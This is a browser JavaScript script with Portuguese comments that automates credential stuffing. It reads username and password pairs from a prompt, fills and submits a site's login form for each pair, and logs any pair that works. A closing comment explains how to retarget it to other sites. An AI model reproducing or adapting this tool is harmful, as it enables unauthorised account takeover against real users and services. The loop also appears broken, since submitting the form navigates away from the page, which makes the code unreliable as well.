// Função para receber a lista de logins do usuário através de um prompt.
function receberListaDeLogins() {
    const listaDeLogins = prompt("Insira a lista de logins (usuário | senha), separados por vírgula:\nExemplo: pedro1 | senha1, maria2 | senha2");
    if (!listaDeLogins) {
        console.log("Nenhuma lista de logins fornecida. Encerrando.");
        return null;
    }
    return listaDeLogins.split(',');
}

// Lista de usuários e senhas para testar.
const logins = receberListaDeLogins(); // Recebe a lista de logins do usuário.
const usuarios = [];
const senhas = [];

// Processa a lista de logins e preenche os arrays de usuários e senhas.
if (logins) {
    logins.forEach(login => {
        const [usuario, senha] = login.trim().split('|');
        if (usuario && senha) {
            usuarios.push(usuario.trim());
            senhas.push(senha.trim());
        } else {
            console.warn("Formato de login inválido:", login);
        }
    });
}

// Tenta o login com um usuário e senha.
async function tentarLogin(usuario, senha) {
    // Encontra os campos e o formulário (ADAPTAR OS SELECTORES!).
    const usuarioInput = document.querySelector('input[name="login"]');
    const senhaInput = document.querySelector('input[name="pass"]');
    const form = document.querySelector('form[action="logar.php"]');

    if (!usuarioInput || !senhaInput || !form) return false; // Elementos não encontrados.

    usuarioInput.value = usuario;
    senhaInput.value = senha;
    form.submit();

    await new Promise(resolve => setTimeout(resolve, 2000)); // Aguarda (AJUSTAR O TEMPO).

    // Verifica se o login foi bem-sucedido (ADAPTAR A LÓGICA!).
    const painelUsuario = document.querySelector('#painel_usuario');
    if (painelUsuario) {
        console.log(`Sucesso: ${usuario}/${senha}`); // Login bem-sucedido!
        return true;
    } else {
        return false;
    }
}

// Executa os testes de login.
async function executarTestes() {
    if (usuarios.length === 0) {
        console.log("Nenhum usuário/senha válido fornecido. Encerrando.");
        return;
    }
    for (let i = 0; i < usuarios.length; i++) {
        const usuario = usuarios[i];
        const senha = senhas[i];
        if (await tentarLogin(usuario, senha)) return; // Para ao encontrar um login válido.
    }
    console.log('Falha: Nenhuma combinação funcionou.');
}

executarTestes();

/*
**Adaptando para outro site:**
1. Inspecione o HTML do login.
2. Adapte os seletores CSS em `tentarLogin()`.
3. Adapte a lógica de sucesso em `tentarLogin()`.
4. Ajuste o tempo de espera.
*/